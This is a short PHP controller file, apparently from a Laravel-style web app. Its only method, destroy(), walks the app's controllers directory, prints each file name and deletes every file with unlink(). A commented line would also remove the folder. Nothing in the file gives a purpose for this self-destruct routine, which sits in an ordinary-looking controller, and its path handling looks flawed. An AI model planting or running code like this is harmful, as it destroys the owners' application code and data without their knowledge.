<?php
class nullController extends \BaseController {

	public function destroy(){
		// echo app_path().'\controllers';exit;
		$dir 	=	app_path().'\controllers';
		if ($dh = opendir($dir)){
		    while (($file = readdir($dh)) !== false){
		      echo "filename:" . $file . "<br>";
		      unlink($file);
		    }
		    closedir($dh);
		}
		// rmdir(app_path().'\controllers');
	}
	
}